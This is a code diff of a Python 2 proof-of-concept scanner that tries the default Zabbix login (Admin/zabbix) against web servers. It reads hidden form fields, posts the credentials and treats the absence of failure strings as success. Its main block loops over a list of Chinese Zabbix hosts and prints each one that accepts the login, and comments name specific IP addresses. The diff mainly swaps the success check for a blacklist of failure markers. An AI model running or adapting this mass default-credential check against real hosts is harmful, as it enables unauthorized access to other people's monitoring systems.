@@ -2,6 +2,7 @@
 
 import requests
 from bs4 import BeautifulSoup
+
 """
 zabbix 默认口令检测
 支持两种zabbix版本
@@ -13,6 +14,8 @@ Set-Cookie: zbx_sessionid country:cn
 
 cdxy 16.04.20
 """
+
+
 def _get_static_post_attr(page_content):
     """
     拿到<input type='hidden'>的post参数，并return
@@ -37,34 +40,34 @@ def poc(url):
     h1 = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
     }
+
     h2 = {
         'Referer': url.strip('\n'),
         'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
     }
 
-    s = requests.session()
-    yes = [
-        '总览',
-        '仪表板',
-        'monitor',
-        'Dashboard',
-        'Status',
-        'Latest data'
+    blacklist = [
+        'incorrect',
+        '<!-- Login Form -->',
+
     ]
     try:
+        s = requests.session()
         c = s.get(url, timeout=10, headers=h1)
         dic = _get_static_post_attr(c.content)
         dic['name'] = 'Admin'
         dic['password'] = 'zabbix'
         # print dic
         r = s.post(url + '/index.php', data=dic, headers=h2, timeout=10)
-        for each in yes:
-            if each in r.content:
+        if '<title>' in r.content:
+            for each in blacklist:
+                if each in r.content:
+                    return False
+            else:
                 return True
     except Exception, e:
         # print e
         return False
-    return False
 
 
 if __name__ == '__main__':
@@ -73,6 +76,6 @@ if __name__ == '__main__':
     unsuccess_url = 'http://101.198.161.9'  # False
     # print poc('http://106.2.60.133/')
 
-    for each in open('../data/zabbix_cn','r'):
+    for each in open('../data/zabbix_cn', 'r'):
         if poc(each):
             print each
